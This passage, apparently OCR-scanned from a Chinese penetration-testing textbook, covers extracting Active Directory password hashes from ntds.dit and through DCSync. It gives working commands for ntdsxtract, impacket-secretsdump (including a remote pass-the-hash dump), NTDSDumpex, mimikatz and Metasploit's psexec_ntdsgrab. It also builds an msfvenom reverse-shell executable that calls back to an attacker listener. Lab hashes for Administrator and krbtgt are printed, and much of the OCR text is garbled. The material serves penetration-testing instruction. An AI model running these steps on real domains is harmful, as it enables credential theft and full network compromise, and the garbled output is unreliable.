xport corpleted.
图6-26提取表信息
导出表信息，如图6-27所示。
rootgkali:-/Desktop/ntds.dit.export#ls-1
rW-r
not
51A4g26
09:36
邮：35
quota_tabte.6
er2.2
24Aug2668:36s
96Aug 26 e0:36 s
图6-27导出表信息
2.导出散列值
在KaliLinux命令行环境中输人如下命令，下载ntdsxtract。
git clone 
在KaliLinux命令行环境中输人如下命令，安装ntdsxtract。
python setup.py build &6 python setup.py insta11
输人如下命令，将导出的ntds.dit.export文件夹和SYSTEM文件一并放人ntdsxtract文件夹。
dsusers.py ntds.dit.export/datatable.3 ntds.dit.export/1ink_table,5 output
--lmoutfile lmout |tee al1_user.txt
将域内的所有用户名及散列值导出到all_user.txt中，如图6-28所示。
---
## Page 307
294内网安全攻防：渗透测试实战指南
Ope-8
List of users:
RecordID:
3562
user principal name:
ser
nae:
Adninistrator
SAM Account
SANAccount type:
naee:
Administrator
bed5cc-8
-bb89116bd36d
hen
created:
2018-07-12 16:42:44+08:00
Account expires:
2018-88-10 15:14:81+08:00
Password last set:
2018-08-1015:13:50.111191+00:00
Never
Last lopon tinestamp:
Last logon:
2018-08-10 15:14:01.390135+00:00
2018-08-12 11:03:17.375986+00:00
Bad password tine
Logon count:
Never
Bad password count:
17
pial-In access perm:
Controlled by policy
ser Account Control:
ncestors:
NORMAL_ACCOUNT
Password hashes:
sRoOT_oBJECTs,com,pentest,users.Administrator
Adninistrator:135d82f83c3698e2e32bcb11f4da741b
图6-28导出域内的所有用户名和散列值
ntds.dit包含域内的所有信息，可以通过分析ntds.dit导出域内的计算机信息及其他信息，命
令如下。
all_computers,csv
执行以上命令，可以导出域内所有计算机的信息，导出文件的格式为CSV，如图6-29所示。
List of corputers!
3585
OC
1D
51-5-21-3112629480-1751665795-4053538595-1891
a-43c2-aeB8-40555fef8636
6.1(7691
Windows Server 2008 R2 Enterprise
05 version
2018-08-1118:11:16+00:00
2018-07-12 16:43:43+00:00
piat-In atcess pern:
Controtted by policy
hcestors
SRoOT oBJECTs cos pentest Domain Controllers DC
ord10:
created
Controlted by policy
图6-29导出城内所有计算机的信息
---
## Page 308
第6章域控制器安全295
6.2.2使用impacket工具包导出散列值
使用impacket 工具包中的 secretsdump，也可以解析ntds.dit 文件，导出散列值。
在KaliLinux的命令行环境中输人如下命令，下载impacket工具包，下载地址见[链接6-3]。
git c1one 
将 impacket 工具包安装到Kali Linux 中。impacket 是使用Python 语言编写的，而 Kali Linux
中默认配置了Python，因此，可以直接输人如下命令，如图6-30所示。
python setup·py insta11
s/setuptoo1s/dist .py:398: Userwarning: Norma
writing iepacket.egg-info/PKG-INFO
et.egg-info/requires.txt
图6-30安装impacket 工具包
执行以上命令后，打开KaliLinux命令行环境，输入如下命令，导出ntds.dit中的所有散列
值，如图6-31所示。
curity Te
pekList,be p
b1cc196adc999630eba6de3377e7
da741b:::
uest :501: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e8c889c8:
krbtgt:502:aad3b435b51404eeaad3b435b51484ce:8f83dc6d427fbb1a42c4abe1848b659
5fc3
user1: 1104: aad3b435b51404eeaad3b435b51404ee:47bf8039a8506cd67c5
8985 :1106: aad3b435b51404ecaad3b435b51404ee: C799257936314185e1d633
erberoskeysfmn-dsdsh
e6fc189738b8c854d11e260f5
sha1 · 96: 9453a70409f68bd9f 7474c1549c279653394
图6-31使用impacket-secretsdump导出用户名和散列值
impacket还可以直接通过用户名和散列值进行验证，从远程域控制器中读取ntds.dit并转储域
散列值，命令如下，如图6-32所示。
---
## Page 309
296内网安全攻防：渗透测试实战指南
impacket-secretsdump
hashe8 aad3b435b51404eeaad3b435b51404ee:135d82f03c3698e2e32bcb11f4da741b
-just-dc pentest.com/PI:EMAIL
tyg
id: Lnhash:nthash)
CS:1981:aad3b4
tshmac-sha]-6:4569a5f861f4334425
4dece6fc189738c854d11e268r5
Adeinistrater:des-chc-nd5:bca42aa70e4cef46
图6-32使用impacket-secretsdump从域控制器中读取信息
6.2.3在Windows下解析ntds.dit并导出域账号和域散列值
使用 NTDSDumpex.exe可以进行导出散列值的操作。NTDSDumpex.exe 的下载地址见[键
接 6-4]。
将ntds.dit、SYSTEM和NTDSDumpex.exe 放在同一目录下，打开命令行环境，输入如下命
令，导出域账号和域散列值，如图6-33所示。
NTDSDumpex.exe -d ntds.dit -s system
partof sfuckToos,Codeby zcgonh
JSYSREY:DN
ion:2k3
02680
rbtqt：502aad3b435b5144ad3b43554048a30506cb24a3f0b359
leted in 0.249 second
图6-33导出城账号和域散列值
6.3利用dcsync获取域散列值
6.3.1使用mimikatz转储域散列值
mimikatz有一个dcsync功能，可以利用卷影拷贝服务直接读取ntds.dit文件并检索域散列值。
需要注意的是，必须使用域管理员权限运行mimikatz才可以读取ntds.dit。
---
## Page 310
第6章域控制器安全297
在域内的任意一台计算机中，以域管理员权限打开命令行环境，运行mimikatz。输人如下命
令，使用mimikatz导出域内的所有用户名及散列值，如图6-34所示。
1sadump: :dcsync/domain:pentest ,com /a11 /csv
odx3[30
krbtgt
106
WIN-HOC70E28R
936314185e1d6338f020a89ec
userl
C$
图6-34使用dcsync获取域内的所有用户名和散列值
使用mimikatz的dcsync功能也可以导出指定用户的散列值。执行如下命令，可以直接导出域
用户Dm的散列值。
1sadump: :dcsync /domain:pentest . com /user : Dm
也可以直接在域控制器中运行mimikatz，通过转储lsass.exe进程对散列值进行Dump操作，
命令如下。
privilege::debug
lsadump::lsa /inject
如图6-35所示，域内的所有账号和域散列值都被导出了。
nimikatz  privi1ege:debug
NTLR135682f03c3698e2e32bcb11f4da741b
LM
36982+32bc
1a-0：b3685ee12542737388ec7ae5ccaf4373
068582
图6-35使用mimikatz 转储lsass.exe 进程
如果没有预先执行privilege:debug命令，将导致权限不足、读取失败。如果用户数量太多，
mimikatz无法完全将其显示出来，可以先执行log命令（会在mimikatz目录下生成一个文本文
件，用于记录mimikatz的所有执行结果）。
---
## Page 311
298内网安全攻防：渗透测试实战指南
6.3.2使用dcsync获取域账号和域散列值
Invoke-DCSync.ps1可以利用dcsync直接读取ntds.di，以获取域账号和域散列值，其下载地
址见[链接6-5]。
输人“Invoke-DCSync-PWDumpFormat”命令（-PWDumpFormat参数用于对输出的内容进行
格式化），如图6-36所示。
sC:UsersadainistratoresktopInuke-SungdOuFora2c
da741b:1
图6-36在 PowerShell 中通过 dcsync 获取数列值
6.4使用Metasploit获取域散列值
1.psexec_ntdsgrab模块的使用
在Kali Linux中进入Metasploit 环境，输人如下命令，使用psexec_ntdsgrab 模块。
use auxi1iary/admin/smb/psexec_ntdsgrab
输人“showoptions”命令，查看需要配置的参数，如图6-37所示。在本实验中，需要配置的
参数有 RHOST、SMBDomain、SMBUser、SMBPass。
Cufrent setting
Rcqusred oescription
CREATE_NEW_VSC
LSOH
ICE
DESCRIPTION
sery
sed on target for pretty Listin
srehas
Aentest.co
adrjnistrator
yes
The nane of the ￥ir
s directery (ex
图6-37配置Metasploit 参数
配置完毕，输人“exploit”命令并执行（该脚本使用卷影拷贝服务），将ntds.dit文件和SYSTEM
项复制并传送到KaliLinux机器的/root/.msf4/loot/文件夹下，如图6-38所示。
接下来，就可以使用impacket工具包等解析ntds.dit文件，导出域账号和域散列值了。
---
## Page 312
第6章城控制器安全299
92.158.196.285：445
92.166.190.205:445
No VSC Found.
00.295:445
000.285:445
Copy crceted
njng a (9
180.285:445
start tine out,
0 
92.158.106.285:445
180.285:445
ntes.dst file
1192.168.160.205:445
56.
Sretered at/rt/esf/t/2205 defal92.1681.95pseedsra.a.b
292.186-180.205:445
[1Auxiliary rodule execution conpleted
图6-38运行脚本
2.基于meterpreter会话获取域账号和域散列值
本实验没有提供域控制器的meterpreter会话。打开Metasploit，依次输入如下命令。
use exploit/multi/handler
set payload windovs/x64/meterpreter/reverse_tcp
set
1host 0.0.0.0
set 1port 5555
输入“showoptions”命令查看配置情况，如图6-39所示。
msf exploit(mutti/handler)> shw eptions
fule optiens (exptoit/mutt1/handter):
Current etRereeriti
aylead opt.iens (windews/x54/meterpreter/reverse_tcp) :
Nane
Curret Setting
pescription
EXITFUNC
Exptoit -target:
1dNase
Wildcard Target
图6-39查看配置
Kali 集成了msfvenom。msfvenom是msfpayload 和 msfencode 的组合，取代了msfpayload和
msfencode，可用于生成多种类型的Payload。
输人如下命令，生成s.exe程序。
msfvenom -p windows/x64/meterpreter/reverse_tcp LHoST=192.168.100.220
LPORT=5555 -f exe > s.exe
可以看到，在root目录下生成了一个s.exe程序，如图6-40所示。运行该程序，会将一个
meterpreter会话反弹到IP地址为192.168.100.220、端口号为5555的机器上。
---
## Page 313
300内网安全攻防：渗透测试实战指南
图6-40生成s.exe程序
为了方便演示，在本实验中直接生成了s.exe程序。在渗透测试中，可以在msfvenom生成时
进行编码，也可以使用其他格式的Payload（例如 PowerShell、VBS等格式的Payload）。
将s.exe上传到目标系统中，然后在之前打开的msfconsole界面中执行“exploit-j-z”命令，
在目标系统中执行s.exe程序。Metasploit会给出获取meterpreter会话的提示，如图6-41所示。
sf exptoit(eulti/handter) > sessions
Active sessions
tdNseType